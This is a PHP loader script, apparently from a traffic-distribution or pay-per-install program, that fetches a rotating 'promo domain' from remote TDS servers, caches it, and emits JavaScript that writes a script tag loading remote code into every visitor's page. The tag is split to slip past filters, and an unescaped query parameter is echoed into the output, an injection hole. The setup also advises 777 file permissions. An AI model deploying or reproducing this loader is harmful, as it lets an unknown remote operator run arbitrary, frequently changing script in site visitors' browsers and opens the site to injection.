<?php

/**
 * Получение текущего промо-домена и добавление его в DOM модель браузера
 * Активный промо-домен записывает в кэш и обновляет каждые 5 минут
 *
 * Для того, чтобы воспользоваться скриптом, нужно:
 *
 * 1. Установить на файл qcjs.domain.cache права 777 (для кеширования доменов)
 *
 * !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 * !!!!!!!!! НАСТРОЙКА ПЕРСОНАЛЬНОЙ КОНФИГУРАЦИИ ПРОМО !!!!!!!!!
 * !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 *
 * Обязательно перед тем, как использовать этот скрипт на сайте
 * сделайте проверку:
 * http://тут-имя-вашего-домена/qcjs.php?debug=1
 *
 *
 * Задаете свой уникальный идентификатор
 * Он доступен по адресу http://qcashload.biz/?p=profile.uniqid
 *
 * Если он будет неправильный, то домен не будет работать!!!
 */
$token = '9ca109db5074d221c63899e45c35076d';

/**
 * Получаем данные с удаленного сервера методом
 * file_get_contents или cURL
 *
 * @param $url      string          Удаленный УРЛ
 * @param $oResult  string|boolean  Значение, которое возвращает сервер
 *
 * @return array|bool               True - если все прошло удачно или массив ошибок
 */
function qcRequest($url, & $oResult)
{
    $errors = array();
    $isValidRequest = false;

    $context = stream_context_create(array('http'  => array(
        'method'    => 'GET',
        'header'    => "Content-type: application/x-www-form-urlencoded\r\n",
        'timeout'   => 10
    )));

    $microtime = microtime(true);

    $oResult = @ file_get_contents($url, false, $context);
    unset($context);

    if (false !== $oResult) {
        return true;
    }

    $errors[] = 'Неудачное обновление через функцию file_get_contents<br />URL: <code>' . $url . '<code><br/>' .
        sprintf('Время выполнения запроса: %.2f секунд', microtime(true) - $microtime);

    foreach(array('allow_url_fopen') as $o) {
        if (0 !== strcasecmp('On', @ ini_get($o))) {
            $errors[] = 'Опция "' . $o . '" установлена в Off. '
                . 'Рекомендуем установить опцию "' . $o . '" в On в файле php.ini '
                . 'или добавить в .htaccess php_flag ' . $o . ' on';
        }
    }

    if ( ! function_exists('curl_init')) {
        $errors[] = 'Библитека CURL не установлена';
        return $errors;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $microtime = microtime(true);

    ob_start();
    if (false === ($result = curl_exec($ch))) {
        $errors[] = 'Неудачное обновление через библиотеку CURL.<br/> URL: <code>' . $url . '</code><br/>' .
            sprintf('Время выполнения запроса: %.2f секунд', microtime(true) - $microtime);
        ob_end_clean();
    } else {
        $oResult = ob_get_clean();
        $isValidRequest = true;
    }
    curl_close($ch);

    return $isValidRequest ? true : $errors;
}

$cacheFileName = dirname(__FILE__) . '/qcjs.domain.cache';
$oErrors = array();
$isValidRequest = false;

if (
    ( ! $isFileExistsCache = file_exists($cacheFileName)) ||
    (filemtime($cacheFileName) + 5 * 60 < time())
) {

    foreach(array(
        'http://tds.temposhare.com/api/promo-js-domain.php?token=' . $token,
        'http://qtds.biz/api/promo-js-domain.php?token=' . $token,
        'http://tds.helptempo.com/api/promo-js-domain.php?token=' . $token
    ) as $url) {

        $oResult = false;
        if (true === ($errors = qcRequest($url, $oResult))) {

            $oResult = trim($oResult);
            if (empty($oResult)) {
                continue;
            }

            $isValidRequest = true;
            break;
        }

        $oErrors = array_merge($oErrors, $errors);
    }

    if ($isValidRequest) {

        $requestedPromoDomain = trim($oResult);
        if (false === file_put_contents($cacheFileName, $requestedPromoDomain)) {
            $oErrors[] = sprintf(
                'Не получилось записать в файл %s. Скорее всего нету прав на запись у пользователя www-data:www-data',
                $cacheFileName
            );
        }
    }
}

if (!empty($_GET['debug'])) {

    header('Content-Type: text/html; charset=utf-8');

    if(!empty($oErrors)) {
        echo '<h3>Список возможных ошибок:</h3>';
        echo '<ul><li>' . join('</li><li>', $oErrors) . '</li></ul>';
    } else {
        echo '<h3>Скрипт работает корректно:</h3>';
        echo '<p>Текущий промо домен: ' . $requestedPromoDomain . '</p>';
    }

    die;
}

if (empty($requestedPromoDomain)) {
    $requestedPromoDomain = file_get_contents($cacheFileName);
}

if (! preg_match('/^http:\/\/(?:[-A-Za-z0-9]+\.)+[A-Za-z]{2,6}$/', $requestedPromoDomain)) {
    $requestedPromoDomain = 'http://dl.qcash.ws';
}

?>

document.write([
    '<scr',
    'ipt type="text/javascr',
    'ipt" src="<?php echo $requestedPromoDomain; ?>/<?php echo empty($_GET['s']) ? '' : $_GET['s'];?>"></sc',
    'ript>'
].join(''));